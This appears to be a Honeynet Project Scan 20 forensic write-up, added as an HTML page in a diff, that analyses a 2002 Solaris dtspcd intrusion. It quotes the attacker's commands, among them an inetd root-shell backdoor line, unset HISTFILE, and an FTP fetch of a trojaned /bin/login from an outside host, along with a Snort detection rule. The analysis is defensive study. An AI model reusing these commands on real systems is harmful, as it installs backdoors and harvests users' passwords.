@@ -1,0 +1,152 @@
+<html><head><title>Honeynet Scan 20</title></head>
+<body bgcolor="#ffffff">
+<pre>
+HoneyNet Scan 20 Questions
+--------------------------
+
+1) What is a NOP slide, and how is this one different from the NOP slide in the
+rpc.statd exploit in Scan 10 ?
+
+NOP slides are commonly used in buffer-overflow exploits to increase the chance
+of the exploit being sucessful.
+A NOP slide removes the need to guess exactly the memory address of the buffer
+to be exploited and the return address. By by padding the exploit buffer with
+NOP's, the chances of a sucessful overflow are increased, because if the return
+address points to a NOP, they are executed sequentially until the exploit
+payload is reached. 
+This exploit differs from the statd exploit in Scan 10, in that Solaris NOP
+codes (80 1c 40 11) are used instead of x86 NOP's (0x90)
+
+2) The attack was on 08 Jan, 2002. Would snort have generated an alert then for
+the attack ?
+
+It would have generated a generic SPARC shell-code alert, but nothing specific
+to this exploit
+
+$ grep 801c.4011 *rules
+shellcode.rules:alert ip $EXTERNAL_NET any -&gt; $HOME_NET any (msg:"SHELLCODE sparc NOOP"; content:"|801c 4011 801c 4011 801c 4011 801c 4011|"; reference:arachnids,353; classtype:shellcode-detect; sid:645; rev:2;)
+
+This rule seems to have been around in one form or another since at least Snort
+1.6.3
+
+3) In the exploit code, the command "/bin/sh sh -i" is given, what is it's
+purpose, and why is 'sh' show twice ?
+
+The attacker is executing a second inetd process to start a back door upon 
+request.
+The complete config file (/tmp/x) for the intruder's inetd process contains 
+"ingreslock stream tcp nowait root /bin/sh sh -i"
+Which indicates that inetd should spawn a copy of /bin/sh for any connections 
+request received on the ingreslock port (1524/tcp)
+The "sh -i" represents the server-arguments to the requested inetd 
+'server-program' (/bin/sh)
+
+&gt;From the inetd.conf(4) man page:
+     server-arguments
+           If a server must be invoked with  command  line  argu-
+           ments,  the entire command line (including argument 0)
+           must appear in  this  field  (which  consists  of  all
+           remaining  words  in the entry)
+
+The -i option creates an interactive terminal session (with echo) on the 
+ingreslock port
+
+4) The attacker executed a variety of commands on the hacked Solaris box. 
+Which commands were automated by the exploit, which commands were manual by 
+the attacker himself ?
+
+Commands appear to have fed to the 'ingreslock' shell via netcat, as a simple
+telnet to the port does not format line feeds correctly.
+This makes it difficult to determine whether they are fully scripted, or just 
+passed in as a batch.
+
+Commands: 
+uname -a;ls -l /core /var/dt/tmp/DTSPCD.log;PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/ccs/bin:/usr/gnu/bin;export PATH;echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print $2}'` (automatic)
+
+# w (manual)
+
+# unset HISTFILE (automatic)
+
+# cd /tmp (automatic)
+
+mkdir /usr/lib (automatic) (last 2 commands in same packet)
+
+# mv /bin/login /usr/lib/libfl.k (manual)
+
+# ftp 64.224.118.115 (automatic)
+
+Password:a@ (automatic)
+
+cd pub (automatic)
+binary (automatic)
+get sun1 (automatic)
+bye (automatic)
+
+# <linefeed> (manual)
+# ls (manual)
+
+# chmod 555 sun1 (manual)
+
+# mv sun1 /bin/login (manual)
+
+
+5) What is sun1, and how does it work ?
+
+sun1 is a /bin/login replacement. I was unable to recover a working binary 
+from the dump, so I am not 100% sure of it's function. (Both Ethereal and 
+tcpflow return a 89776 byte binary, whereas the FTP session in the trace 
+indicates the binary should be 90544 bytes). However it almost certainly a 
+back-doored login or a password harvester. I tend to think that it is more 
+likely a password harvester, as the intruder tests that it returns a login 
+banner, but does not test whether he can get a shell.
+
+6) What did you learn from this exercise ?
+
+Quite a bit about buffer overflows (Thanks to Mudge &amp; Aleph1), also 
+confirmation about what great tools snort &amp; ethereal are.
+
+7) How long did this challenge take you ?
+
+About 6 - 8 hours including some revision with the buffer overflow tutorials.
+
+8) (Bonus) One of the commands executed during the attack is
+echo "BD PID(s): "`ps -fed|grep '-s /tmp/x'|grep -v grep|awk '{print $2}'`
+What is the purpose of this command and what does 'BD' stand for ?
+
+The purpose of the command is to identify the process-id of the inetd process 
+running the back-door (identified by the /tmp/x as the config file). The 
+'grep -v grep' is to remove the grep itself from the listing, and the awk 
+command will print the second column of the ps output (ie the PID)
+
+The command returns the following to the intruder.
+BD PID(s): 3476
+
+Although the intruder then knows the pid of the inetd process, surprisingly
+he does not kill it off, or make any other attempt to conceal it.
+(At least not in the logs available). 
+This also appears tp support the theory, that the intruder wants to harvest 
+passwords, as he would need to return to collect stolen passwords. At a quick 
+inspection, the login replacement does not seem to mail the stolen passwords.
+
+BD presumably stands for Back Door.
+
+References
+----------
+
+Snort - http://www.snort.org
+Ethereal - http://www.ethereal.com/
+tcpflow - http://www.circlemud.org/~jelson/software/tcpflow/
+netcat - http://www.atstake.com/research/tools/nc110.tgz
+
+Smashing the stack for fun and profit - Aleph1 (http://www.mirrors.wiretapped.net/security/info/textfiles/phrack/phrack49.txt)
+Buffer Overflow Tutorial - Mudge (http://www.insecure.org/stf/mudge_buffer_overflow_tutorial.html)
+dtspcd Buqtraq ID 3517 (http://online.securityfocus.com/bid/3517)
+CERT Advisory (http://www.cert.org/advisories/CA-2002-01.html)
+X-Force (http://xforce.iss.net/alerts/advise101.php)
+Snort signature (http://www.snort.org/snort-db/sid.html?id=1398)
+
+--
+Stephen Tremain
+stephent@db.com
+</linefeed></pre>
+</body></html>
